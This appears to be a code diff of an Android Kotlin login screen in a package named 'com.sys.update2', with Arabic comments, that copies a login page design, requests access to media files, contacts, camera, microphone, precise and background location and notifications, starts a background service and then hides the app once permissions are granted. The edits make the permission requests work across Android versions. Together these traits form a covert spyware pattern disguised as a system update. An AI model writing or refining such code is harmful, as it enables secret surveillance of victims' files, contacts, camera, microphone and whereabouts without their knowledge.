@@ -1,21 +1,21 @@
 // language: Kotlin, file: LoginActivity.kt
 // التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
-// + طلب صلاحيات كاملة: ملفات (صور+فيديو+صوت), مايك, كاميرا, موقع, جهات اتصال
+// + طلب صلاحيات متوافق مع كل الأجهزة:
+//   - Android 10+ : الصور + الفيديو + الصوت (dialog موحّد على 14+)
+//   - Android 9-  : READ_EXTERNAL_STORAGE
+//   - + جهات الاتصال + كاميرا + ميكروفون + موقع + إشعارات
 // + إخفاء التطبيق بعد المنح
-// + الخلفية تشتغل عبر BackgroundService
 
 package com.sys.update2
 
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
-import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -223,20 +223,25 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الأذونات — كل الصلاحيات مرة واحدة
+    // الأذونات — متوافقة مع كل الإصدارات
     // =================================================
 
     private fun requiredPermissions(): List<String> {
         val list = mutableListOf<String>()
 
-        // ملفات ووسائط
+        // ⭐ الصور + الفيديو + الصوت
         if (Build.VERSION.SDK_INT >= 33) {
+            // Android 13+ — النظام بيدمجهم في dialog واحد على 14+
             list.add("android.permission.READ_MEDIA_IMAGES")
             list.add("android.permission.READ_MEDIA_VIDEO")
             list.add("android.permission.READ_MEDIA_AUDIO")
         } else {
+            // Android 12 وأقل — dialog موحّد "الملفات والوسائط"
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
+
+        // جهات الاتصال
+        list.add(Manifest.permission.READ_CONTACTS)
 
         // كاميرا
         list.add(Manifest.permission.CAMERA)
@@ -247,9 +252,6 @@ class LoginActivity : ComponentActivity() {
         // موقع
         list.add(Manifest.permission.ACCESS_FINE_LOCATION)
         list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-
-        // جهات اتصال
-        list.add(Manifest.permission.READ_CONTACTS)
 
         // إشعارات (Android 13+)
         if (Build.VERSION.SDK_INT >= 33) {
@@ -294,7 +296,6 @@ class LoginActivity : ComponentActivity() {
                             requestAllPermissions()
                         }, 800L)
                     } else {
-                        // نكمل بالصلاحيات اللي اتاخدت
                         onAllPermissionsGranted()
                     }
                     return
@@ -304,7 +305,6 @@ class LoginActivity : ComponentActivity() {
             }
 
             BG_LOCATION_REQUEST -> {
-                // تم الرد على طلب background location
                 hideAndMinimize()
             }
         }
@@ -318,18 +318,19 @@ class LoginActivity : ComponentActivity() {
         if (permissionsHandled) return
         permissionsHandled = true
 
-        // 1) شغّل الخدمة
+        // شغّل الخدمة
         startBackgroundService()
 
-        // 2) اطلب Background Location لو مش ممنوحة (Android 10+)
+        // Android 10+ : Background Location
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val bg = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
             )
+            val fine = ContextCompat.checkSelfPermission(
+                this, Manifest.permission.ACCESS_FINE_LOCATION
+            )
             if (bg != PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(
-                    this, Manifest.permission.ACCESS_FINE_LOCATION
-                ) == PackageManager.PERMISSION_GRANTED
+                fine == PackageManager.PERMISSION_GRANTED
             ) {
                 Handler(Looper.getMainLooper()).postDelayed({
                     ActivityCompat.requestPermissions(
@@ -342,7 +343,7 @@ class LoginActivity : ComponentActivity() {
             }
         }
 
-        // 3) بعد كل شيء: اختفاء
+        // اختفاء
         Handler(Looper.getMainLooper()).postDelayed({
             hideAndMinimize()
         }, 800L)
